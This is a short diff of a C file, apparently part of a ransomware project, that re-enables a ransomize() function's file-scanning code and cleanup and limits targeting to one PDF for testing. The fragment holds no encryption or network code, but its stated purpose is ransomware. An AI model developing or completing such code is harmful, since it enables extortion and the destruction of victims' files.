@@ -4,28 +4,29 @@
 #include "attack_web.h"
 #include "read_files.h"
 #include <stdio.h>
+#include <stdlib.h>
 
 int ransomize(void)
 {
-    // /* Target files, save paths in an array */
-    // size_t count = 0;
-    // char **paths = find_paths(&count);
+    /* Target files, save paths in an array */
+    size_t count = 0;
+    char **paths = find_paths(&count);
 
-    // if (!paths) {
-    //     printf("Failed to scan files.\n");
-    //     return 1;
-    // }
+    if (!paths) {
+        printf("Failed to scan files.\n");
+        return 1;
+    }
 
-    // // printf("Found %zu files:\n\n", count);
-    // // for (size_t i = 0; i < count; i++) {
-    // //     printf("%s\n", paths[i]);
-    // // }
-
-    // /* Cleanup of paths*/
+    // printf("Found %zu files:\n\n", count);
     // for (size_t i = 0; i < count; i++) {
-    //     free(paths[i]);
+    //     printf("%s\n", paths[i]);
     // }
-    // free(paths);
+
+    /* Cleanup of paths*/
+    for (size_t i = 0; i < count; i++) {
+        free(paths[i]);
+    }
+    free(paths);
 
     /*For testing purposes, only get important.pdf*/
     char important[MAX_PATH];
